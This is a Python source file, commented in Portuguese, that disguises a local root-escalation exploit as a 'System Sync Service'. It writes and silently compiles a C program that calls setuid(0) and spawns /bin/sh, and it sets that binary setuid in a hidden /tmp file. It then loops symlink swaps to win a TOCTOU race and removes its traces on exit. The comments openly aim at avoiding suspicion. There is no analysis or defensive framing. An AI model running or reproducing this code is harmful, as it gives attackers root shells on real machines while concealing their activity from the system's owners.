import os
import time
import threading
import subprocess

class SystemSyncService:
    def __init__(self):
        # Nomes de arquivos menos suspeitos
        self.target_path = "/tmp/.sys_update_bin"
        self.payload_path = "/tmp/.cache_data_temp"
        self.trigger_flag = False
        self.cve_ref = "2026-41651" # Referência interna discreta

    def _prepare_env(self):
        """Prepara o ambiente de forma silenciosa."""
        c_code = """
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>
        int main() {
            setuid(0);
            setgid(0);
            system("/bin/sh");
            return 0;
        }
        """
        # Esconde o código fonte em um arquivo oculto
        src_tmp = "/tmp/.v_src_cache.c"
        with open(src_tmp, "w") as f:
            f.write(c_code)
        
        # Compilação silenciosa
        try:
            subprocess.run(
                ["gcc", src_tmp, "-o", self.payload_path], 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            os.remove(src_tmp)
            os.chmod(self.payload_path, 0o4755)
        except Exception:
            pass

    def _run_sync_logic(self):
        """
        Executa a alternância de links (Race Condition) para explorar a janela TOCTOU.
        """
        while not self.trigger_flag:
            try:
                if os.path.exists(self.target_path):
                    os.unlink(self.target_path)
                os.symlink(self.payload_path, self.target_path)
                # Timing ajustado para aumentar a probabilidade de acerto na janela
                time.sleep(0.00005) 
            except OSError:
                pass

    def start_service(self):
        """Inicia o serviço de sincronização (Exploit)."""
        # Log minimalista para não gerar suspeitas
        print(f"[i] Starting System Sync Service...")
        
        self._prepare_env()

        # Thread operacional
        worker = threading.Thread(target=self._run_sync_logic)
        worker.daemon = True
        worker.start()

        try:
            # Mantém o processo vivo simulando um serviço de monitoramento
            while True:
                time.sleep(10)
        except KeyboardInterrupt:
            self.trigger_flag = True
            self._cleanup()

    def _cleanup(self):
        """Remove rastros básicos após a interrupção."""
        for path in [self.target_path, self.payload_path]:
            if os.path.exists(path):
                try:
                    os.remove(path)
                except:
                    pass

if __name__ == "__main__":
    service = SystemSyncService()
    service.start_service()
